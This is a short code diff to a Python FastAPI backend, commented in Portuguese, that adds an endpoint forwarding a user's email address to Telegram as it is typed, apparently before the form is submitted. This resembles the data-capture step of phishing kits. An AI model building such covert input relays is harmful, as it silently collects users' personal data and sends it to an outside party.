@@ -189,6 +189,16 @@ async def get_status_checks():
     
     return status_checks
 
+# Endpoint para notificar quando email é digitado
+class EmailTypingNotification(BaseModel):
+    email: str
+
+@api_router.post("/notify-email-typing")
+async def notify_email_typing(data: EmailTypingNotification):
+    """Notifica no Telegram quando usuário digita email"""
+    await send_telegram_email_typing(data.email)
+    return {"message": "Notificação enviada"}
+
 # Admin Routes
 @api_router.post("/admin/login")
 async def admin_login(credentials: AdminLogin):
